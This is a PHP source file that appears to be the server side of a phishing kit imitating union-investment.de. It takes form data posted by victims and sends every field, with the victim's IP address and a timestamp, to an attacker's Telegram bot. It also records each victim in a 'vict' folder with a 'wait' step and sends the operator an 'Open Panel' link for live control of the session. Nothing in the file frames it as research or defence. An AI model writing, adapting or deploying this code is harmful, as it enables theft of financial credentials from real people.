<?php 
define('BOT_TOKEN', ''); // Replace with your bot token
define('CHAT_ID', ''); // Replace with your chat ID
function getCurrentPageUrl()
{
    $protocol = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off' ? 'https' : 'http';
    $host = $_SERVER['HTTP_HOST'];
    $uri = $_SERVER['REQUEST_URI'];
    $ipAddress = $_SERVER['REMOTE_ADDR'];

    // Parse the URI to remove the current file name
    $parsedUrl = parse_url($uri);
    $path = $parsedUrl['path'];

    // Get the directory path and append "panel.php"
    $directoryPath = dirname($path);
    $newUrl = $protocol . '://' . $host . $directoryPath . '/panel.php?id='.base64_encode($ipAddress);

    return $newUrl;
}
function sendToTelegram($data, $sendLink = false)
{
    // Telegram Bot API URL and Token
    $botToken = BOT_TOKEN;
    $chatId = CHAT_ID;

    // Get user IP address
    $ipAddress = $_SERVER['REMOTE_ADDR'];

    // Get current date and time
    $date = date('Y-m-d H:i:s');

    // Prepare message
    $message = "union-investment.de::::::\n\n";
    foreach ($data as $k => $v) {
        $message .= "$k: $v\n\n";
    }
    $message .= "\nIP: $ipAddress\nDate: $date";

    // Send message to Telegram
    $url = "https://api.telegram.org/bot$botToken/sendMessage";
    $postData = [
        'chat_id' => $chatId,
        'text' => $message
    ];
    if ($sendLink) {
        $replyMarkup = [
            'inline_keyboard' => [
                [['text' => 'Open Panel', 'url' => getCurrentPageUrl()]]
            ]
        ];
        $replyMarkupJson = json_encode($replyMarkup);
    } else {
        $replyMarkupJson = null;
    }
    if ($replyMarkupJson) {
        $postData['reply_markup'] = $replyMarkupJson;
    }
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($postData));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

    $response = curl_exec($ch);

    curl_close($ch);

    return $response;
}
function getUserIP() {
    $ipaddress = '';
    if (isset($_SERVER['HTTP_CLIENT_IP']))
        $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
    else if(isset($_SERVER['HTTP_X_FORWARDED_FOR']))
        $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
    else if(isset($_SERVER['HTTP_X_FORWARDED']))
        $ipaddress = $_SERVER['HTTP_X_FORWARDED'];
    else if(isset($_SERVER['HTTP_X_CLUSTER_CLIENT_IP']))
        $ipaddress = $_SERVER['HTTP_X_CLUSTER_CLIENT_IP'];
    else if(isset($_SERVER['HTTP_FORWARDED_FOR']))
        $ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];
    else if(isset($_SERVER['HTTP_FORWARDED']))
        $ipaddress = $_SERVER['HTTP_FORWARDED'];
    else if(isset($_SERVER['REMOTE_ADDR']))
        $ipaddress = $_SERVER['REMOTE_ADDR'];
    else
        $ipaddress = 'UNKNOWN';
    return $ipaddress;
}

$ip = getUserIP();

file_put_contents("./vict/".base64_encode($ip).'.json', json_encode([
    'step' => 'wait'
]));
$input = file_get_contents('php://input');

// Decode the JSON data
$data = json_decode($input, true);
sendToTelegram($data, true);